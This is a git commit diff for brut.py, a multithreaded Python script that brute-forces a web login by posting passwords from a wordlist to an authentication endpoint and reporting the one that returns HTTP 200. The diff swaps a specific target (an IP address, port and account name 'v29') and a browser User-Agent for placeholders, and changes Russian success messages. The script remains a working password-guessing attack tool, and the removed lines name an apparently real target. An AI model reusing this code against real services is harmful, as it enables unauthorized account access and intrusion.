32c0434d5a3630803c6d929150525c99529b6d28
Cooper14052 <79376063+Cooper14052@users.noreply.github.com>
2023-01-08 23:28:37 +0300

    v3
    v3

--- brut.py
+++ brut.py
@@ -2,10 +2,10 @@ import requests
 import threading
 
 THREADS_NUM = 30
-HOST = 'http://185.87.48.157:5048/auth'
+HOST = '...'
 
-port = 5048
-login = 'v29'
+port = 22
+login = '...'
 
 right_pass = ''
 count = 1
@@ -14,7 +14,7 @@ lock = threading.Lock()
 
 password_list = []
 
-with open('pwlist.txt', 'r', encoding='UTF-8') as file:
+with open('...txt', 'r', encoding='UTF-8') as file:
     for line in file:
         password_list.append(line.removesuffix('\n'))
 
@@ -24,15 +24,11 @@ def check_password(pass_list):
     global right_pass
     for password in pass_list:
         json = {"login": login, "password": password}
-        headers = {"Accept": "*/*",
-                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-                                 "AppleWebKit/537.36 (KHTML, like Gecko)"
-                                 "Chrome/107.0.0.0 Safari/537.36"}
+        headers = {"Accept": "",
+                   "User-Agent": ""}
         try:
             request = requests.post(url=HOST, json=json, headers=headers, timeout=10)
             if request.status_code == 200:
-                print('\033[31m Успех! Пароль верный! \033[0m', login, password)
-                print('Кол-во попыток:', count)
                 right_pass = password
                 return right_pass
             else:
@@ -62,7 +58,7 @@ for i_thread in threads_list:
     i_thread.join()
 
 if right_pass:
-    print('Ураааааааааааааааа!!! Пароль: ', right_pass, count)
+    print('Верный пароль: ', right_pass, count)
     print('Нажмите любую клавишу...')
     a = input()
 
